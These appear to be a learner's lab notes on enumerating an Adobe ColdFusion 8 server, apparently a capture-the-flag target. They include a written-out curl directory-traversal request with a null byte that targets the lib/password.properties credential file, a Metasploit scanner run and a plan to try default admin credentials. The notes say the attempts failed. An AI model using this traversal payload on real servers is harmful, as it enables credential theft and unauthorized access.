Likely a windows 2008 server

10.129.132.220:8500 in the browser reveals a directory. After navigating a bit I discovered the usage of CF Adobe coldfusion 8.
Some research tells me that /CFIDE/Administrator is a common path, and when tested the login page was revealed. 
  Admin credential is already auto-populated. Going to try default credentials.


Found a metasploit module to scan coldfusion:
msf6 auxiliary(scanner/http/coldfusion_locale_traversal) > run

ran curl -i http://10.129.132.220:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../../lib/password.properties%00en
and a few others but they just redirected me to the login page html.

This metasploit module didn't work either. Trying to enumerate further.
